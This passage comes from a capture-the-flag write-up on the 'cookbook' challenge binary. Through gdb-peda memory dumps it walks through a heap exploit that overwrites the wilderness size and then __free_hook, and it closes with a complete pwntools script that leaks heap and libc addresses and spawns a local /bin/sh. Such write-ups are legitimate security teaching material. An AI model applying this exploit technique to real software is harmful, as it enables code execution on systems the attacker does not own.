EBX: 0x0 
ECX: 0xf7fae5e7 --> 0xfaf87c0a 
EDX: 0x1 
ESI: 0xf7fae5a0 --> 0xfbad208b 
EDI: 0xf7fac960 --> 0x0 
EBP: 0xffffcf18 --> 0x9 ('\t')
ESP: 0xffffcec8 --> 0xffffcf18 --> 0x9 ('\t')
EIP: 0xf7fd7c89 (<__kernel_vsyscall+9>:	pop    ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7fd7c83 <__kernel_vsyscall+3>:	mov    ebp,esp
   0xf7fd7c85 <__kernel_vsyscall+5>:	sysenter 
   0xf7fd7c87 <__kernel_vsyscall+7>:	int    0x80
=> 0xf7fd7c89 <__kernel_vsyscall+9>:	pop    ebp
   0xf7fd7c8a <__kernel_vsyscall+10>:	pop    edx
   0xf7fd7c8b <__kernel_vsyscall+11>:	pop    ecx
   0xf7fd7c8c <__kernel_vsyscall+12>:	ret    
   0xf7fd7c8d:	nop
[------------------------------------stack-------------------------------------]
0000| 0xffffcec8 --> 0xffffcf18 --> 0x9 ('\t')
0004| 0xffffcecc --> 0x1 
0008| 0xffffced0 --> 0xf7fae5e7 --> 0xfaf87c0a 
0012| 0xffffced4 --> 0xf7ed03e3 (<read+35>:	pop    ebx)
0016| 0xffffced8 --> 0xf7fac300 --> 0x0 
0020| 0xffffcedc --> 0xf7e6362f (<_IO_file_underflow+303>:	add    esp,0x10)
0024| 0xffffcee0 --> 0x0 
0028| 0xffffcee4 --> 0xf7fae5e7 --> 0xfaf87c0a 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0xf7fd7c89 in __kernel_vsyscall ()
gdb-peda$ x/40wx 0x804f2b0
0x804f2b0:	0xf7fae9e8	0xf7fae9e8	0x0804f2a8	0x0804f2a8
0x804f2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f300:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f310:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f320:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f330:	0x00000000	0x00000000	0x00000000	0x0804f2b0
0x804f340:	0x38323735	0x00000379	0xf7fae7b0	0xf7fae7b0
gdb-peda$ x/2wx 0x804f348
0x804f348:	0xf7fae7b0	0xf7fae7b0
```

So we can see here there is a new wilderness value at `0x804f348` which is within the area we can write to it using our stale pointer. Let's try that.

```
gdb-peda$ c
Continuing.
d
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
q
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
c
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
i
00001111222233334444
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
EAX: 0xfffffe00 
EBX: 0x0 
ECX: 0xf7fae5e7 --> 0xfaf87c0a 
EDX: 0x1 
ESI: 0xf7fae5a0 --> 0xfbad208b 
EDI: 0xf7fac960 --> 0x0 
EBP: 0xffffce78 --> 0x9 ('\t')
ESP: 0xffffce28 --> 0xffffce78 --> 0x9 ('\t')
EIP: 0xf7fd7c89 (<__kernel_vsyscall+9>:	pop    ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7fd7c83 <__kernel_vsyscall+3>:	mov    ebp,esp
   0xf7fd7c85 <__kernel_vsyscall+5>:	sysenter 
   0xf7fd7c87 <__kernel_vsyscall+7>:	int    0x80
=> 0xf7fd7c89 <__kernel_vsyscall+9>:	pop    ebp
   0xf7fd7c8a <__kernel_vsyscall+10>:	pop    edx
   0xf7fd7c8b <__kernel_vsyscall+11>:	pop    ecx
   0xf7fd7c8c <__kernel_vsyscall+12>:	ret    
   0xf7fd7c8d:	nop
[------------------------------------stack-------------------------------------]
0000| 0xffffce28 --> 0xffffce78 --> 0x9 ('\t')
0004| 0xffffce2c --> 0x1 
0008| 0xffffce30 --> 0xf7fae5e7 --> 0xfaf87c0a 
0012| 0xffffce34 --> 0xf7ed03e3 (<read+35>:	pop    ebx)
0016| 0xffffce38 --> 0xf7fac300 --> 0x0 
0020| 0xffffce3c --> 0xf7e6362f (<_IO_file_underflow+303>:	add    esp,0x10)
0024| 0xffffce40 --> 0x0 
0028| 0xffffce44 --> 0xf7fae5e7 --> 0xfaf87c0a 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0xf7fd7c89 in __kernel_vsyscall ()
gdb-peda$ x/40wx 0x804f2b0
0x804f2b0:	0xf7fae7b0	0xf7fae7b0	0x00000000	0x00000000
0x804f2c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f2f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f300:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f310:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f320:	0x00000000	0x00000000	0x00000000	0x00000000
0x804f330:	0x00000000	0x00000000	0x00000000	0x30303030
0x804f340:	0x31313131	0x32323232	0x33333333	0x34343434
```

So we can see here that we were able to successfully write over the wilderness value with `3333`. In our exploit, because of how our input is different than here, the offset to the wilderness will only be `8` bytes instead of `12` (so it will be where we put `2222`). In addition to that we will write to it `0xffffffff`, and we will write the value after it to be `0x0` because of the trailing newline.

#### Write over free hook

Now that we have overwritten the wilderness value, we can allocate space in other sections of memory. To write to the free hook, we will do this in two allocations. The first one will bring us a little before the free hook (reason why it isn't right up untill the free hook is because of the heap meta data which we also have to take into account). With the input from our second allocation, we will be able to write directly over the free hook. First let's find the offsets (At this point I will be working from my exploit):

First start the exploit
```
$	python exploit.py 
[+] Starting local process './cookbook': pid 9239
[*] running in new terminal: /usr/bin/gdb -q  "/Hackery/bkp16/cookbook/cookbook" 9239
[+] Waiting for debugger: Done
[*] Heap leak is: 0x8ffe6d8
[*] Wilderness is at: 0x8fff410
[*] Address of free: 0xf75e0dc0
[*] Address of system: 0xf75a9060
```

So we need to figure out first the address of where the wilderness is at, and the space needed for the firts allocations. 

```
gdb-peda$ find 0xffffffff
Searching for '0xffffffff' in: None ranges
Found 1717 results, display max 256 items:

```

There are a lot of instances of `0xffffffff`, however only one that is in the heap so it is fairly easy to spot.

```
  [heap] : 0x8fff414 --> 0xffffffff 
```

and when we analyze it:
```
gdb-peda$ x/wx 0x8fff414
0x8fff414:	0xffffffff
gdb-peda$ x/2wx 0x8fff410
0x8fff410:	0x00000000	0xffffffff
```

So we can see that the wilderness starts at `0x8fff414`. We can use python to find the offset:

```
>>> hex(0x8fff414 - 0x8ffe6d8)
'0xd3c'
```

So we know where the wilderness starts (since we know the offset from the heap address we leaked, which should be the same). We also know where the free hook is. Now we can calculate how much space we need to allocate, so our next allocation will overwrite the free hook. To do that, we will use this formula:

For this part, whenever I allocate more heap memeory, I am doing it with the `g` option in the main menu.

```
	malloc_to_freehook = (freehook - 16) - wilderness
```

Essentially it's just the different between the wilderness and the freehook minues 16 to make room for the heap metadata. After we allocate that much space, we can see the data around the free hook:

```
Stopped reason: SIGINT
0xf774dc89 in __kernel_vsyscall ()
gdb-peda$ x/wx 0xf77258b0
0xf77258b0 <__free_hook>:	0x00000000
gdb-peda$ x/9wx 0xf7725890
0xf7725890:	0x00000000	0x00000000	0x00000000	0x00000000
0xf77258a0:	0x00000000	0x00000000	0x00000000	0x118d9b61
0xf77258b0 <__free_hook>:	0x00000000
```

So we can see that our free hook is right after the wilderness values (the amount of space we allocated here was `0xee726490` and `0xffffffff - 0xee726490 = 0x118d9b6f` so it is what we would expect it to be). Let's allocate more space on the heap, and this time just write the address of `system`, then see what the memory looks like:

```
Stopped reason: SIGINT
0xf774dc89 in __kernel_vsyscall ()
gdb-peda$ x/9wx 0xf7725890
0xf7725890:	0x00000000	0x00000000	0x00000000	0x00000000
0xf77258a0:	0x00000000	0x00000000	0x00000000	0x00000011
0xf77258b0 <__free_hook>:	0xf75a9060
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf75a9060 <system>
```

So we can see that we have successfully written over the value for free_hook with the address of system. Now when the free function runs, it will trigger the hook which will run the system function. Now to pass it an argument, what we can do is make a heap pointer to the `system` argument by giving the cookbook a new name (name is the argument), and when we remove the cookbook's name, free will be run with a pointer to our argument (so system will get our argument), and we will have remote code execution.

##Exploit

Putting it all together, we get this exploit:

```
'''
This exploit is based off of this writeup with multiple parts (one of the best writeups I ever saw):
https://www.youtube.com/watch?v=f1wp6wza8ZI
https://www.youtube.com/watch?v=dnHuZLySS6g
https://www.youtube.com/watch?v=PISoSH8KGVI
link to exploit: https://gist.github.com/LiveOverflow/dadc75ec76a4638ab9ea#file-cookbook-py-L20
'''

#Import ctypes for signed to unsigned conversion, and pwntools to make life easier
import ctypes
from pwn import *

#Establish the got address for the free function, and an integer with value zero
gotFree = 0x804d018
zero = 0x0

#Establish the target
target = process('./cookbook')
#gdb.attach(target)

#Send the initial name, guyinatuxedo
target.sendline('guyinatuxedo')

#This function will just reset the heap, by mallocing 5 byte size blocks with the string "00000" by giving the cookbook a name
def refresh_heap(amount):
	for i in range(0, amount):
		target.sendline("g")
		target.sendline(hex(0x5))
		target.sendline("00000")
		recv()
		recv()


#These are functions just to scan in output from the program
def recv():
	target.recvuntil("====================")

def recvc():
	target.recvuntil("[q]uit")

def recvd():
	target.recvuntil("------\n")

#This function will leak a heap address, and calculate the address of the wilderness
def leakHeapadr():
	#Create a new recipe, and add an ingredient
	target.sendline('c')
	recvc()
	target.sendline('n')
	recvc()
	target.sendline('a')
	recvc()
	target.sendline('water')
	target.sendline('0x1')

	#Delete the recipe to free it
	target.sendline('d')
	recvc()

	#Print the stale pointer, and parse out the heap infoleak
	target.sendline('p')
	target.recvuntil("recipe type: (null)\n\n")
	heapleak = target.recvline()
	heapleak = heapleak.replace(' -', '')
	heapleak = int(heapleak)

	#Calculate the address of the wilderness
	global wilderness
	wilderness = heapleak + 0xd38

	#Print the results
	log.info("Heap leak is: " + hex(heapleak))
	log.info("Wilderness is at: " + hex(wilderness))
	target.sendline('q')
	recv()
	recvc()

#This function will grab us a leak to libc, and calculate the address for system and the free hook
def leakLibcadr():
	#Add a new ingredient, give it a name, price, calories, then save and exit
	target.sendline('a')
	recv()
	target.sendline('n')
	recv()
	target.sendline('g')
	target.sendline('7539')
	recv()
	target.sendline('s')
	target.sendline('2')
	recv()
	target.sendline('p')
	target.sendline('1')
	recv()
	target.sendline('e')
	recv()
	target.sendline('q')
	recv()

	#Go into create recipe menu, use the isntructions write `i` to write over the ingredient with the got address of Free
	target.sendline('c')
	recvc()
	target.sendline('i')
	target.sendline('0'*12 + p32(gotFree) + p32(zero))
	recvc()
	target.sendline('q')
	recv()

	#Print the infoleak and parse it out
	target.sendline('l')
	recvc()
	for i in xrange(9):
		recvd()
	target.recvline()
	libcleak = target.recvline()
	libcleak = ctypes.c_uint32(int(libcleak.replace("calories: ", "")))
	libcleak = libcleak.value
	
	#Calculate the addresses for system and the freehook, print all three addresses
	global sysadr
	sysadr = libcleak - 0x37d60
	global freehook
	freehook = libcleak + 0x144af0
	log.info("Address of free: " + hex(libcleak))
	log.info("Address of system: " + hex(sysadr))
	log.info("Address of free hook: " + hex(freehook))

#This function will overwrite the value that specifies how much of the heap is left (overwriteWilderness) with 0xffffffff so we can use malloc/calloc to allocate space outside of the heap
def overwriteWilderness():

	#This will allow us to start with a fresh new heap, so it will make the next part easier
	refresh_heap(0x100)
	
	#Create a new stalepointer, which will be used later 
	target.sendline('c')
	recvc()
	target.sendline('n')
	recvc()
	target.sendline('d')
	recvc()
	target.sendline('q')
	recv()

	#Add two new ingredients, then free one. This will position the wilderness value at a spot which we can easily write to it
	target.sendline('a')
	recv()
	target.sendline('n')
	recv()
	target.sendline('n')
	recv()
	target.sendline('d')
	recv()
	target.sendline('q')
	recv()

	#Write over the wilderness value which is 8 bytes away from the start of our input, with 0xffffffff
	target.sendline('c')
	recvc()
	target.sendline('i')
	recvc()
	wildernessWrite = p32(0x0) + p32(0x0) + p32(0xffffffff) + p32(0x0)
	target.sendline(wildernessWrite)
	recvc()
	target.sendline('q')
	recv()

def overwriteFreehook():

	#Calculate the space that we will need allocate to get right before the free hook
	malloc_to_freehook = (freehook - 16) - wilderness
	log.info("Space from wilderness to freehook is : " + hex(malloc_to_freehook))

#	This is one of the breakpoints that I used in the `Write over free hook` portion of the writeup
#	raw_input()
	#Allocate that much space by giving a cookbook a name of that size
	target.sendline('g')
	target.sendline(hex(malloc_to_freehook))
	target.sendline('0000')
	recv()

#	This is one of the breakpoints that I used in the `Write over free hook` portion of the writeup
#	raw_input()
	#Now that the heap is aligned, the next name should write over the freehook, which we write over it with the address of system
	target.sendline('g')
	target.sendline(hex(5))
	target.sendline(p32(sysadr))
	recv()

#	This is one of the breakpoints that I used in the `Write over free hook` portion of the writeup
#	raw_input()
	#Next we will allocate a new space in the heap, and store our argument to system in it
	target.sendline('g')
	target.sendline(hex(8))
	target.sendline("/bin/sh")
	recv()

	#Lastly we will run free om the space malloced in the last block, so we can run free with the system function as a hook, with an argument that is a pointer to "/bin/sh"
	target.sendline('R')
	recv()

	#Recieve some additional output that we didn't do earlier (unimportant for the exploit)
	recv()
	recv()
	recvc()

#Run the four function that make up this exploit
leakHeapadr()
leakLibcadr()
overwriteWilderness()
overwriteFreehook()

#Drop to an interactive shell
log.info("XD Enjoy your shell XD")
target.interactive()
```

and when we run it...

```
$	python exploit.py 
[+] Starting local process './cookbook': pid 9654
[*] Heap leak is: 0x84526d8
[*] Wilderness is at: 0x8453410
[*] Address of free: 0xf7580dc0
[*] Address of system: 0xf7549060
[*] Address of free hook: 0xf76c58b0
[*] Space from wilderness to freehook is : 0xef272490
[*] XD Enjoy your shell XD
[*] Switching to interactive mode

$ w
 15:29:54 up  3:39,  1 user,  load average: 1.32, 1.37, 1.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               11:52    3:38m  3:12   0.04s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ ls
58056c425dc617b65f94a8b558a4699fedf4a9fb      options
58056c425dc617b65f94a8b558a4699fedf4a9fb.tgz  peda-session-cookbook.txt
cookbook                      peda-session-dash.txt
core                          peda-session-ls.txt
exploit.py                      readme.md
Ingredient struct                  recipe_struct
libc.so.6                      try.py
```

Just like that, we popped a shell!
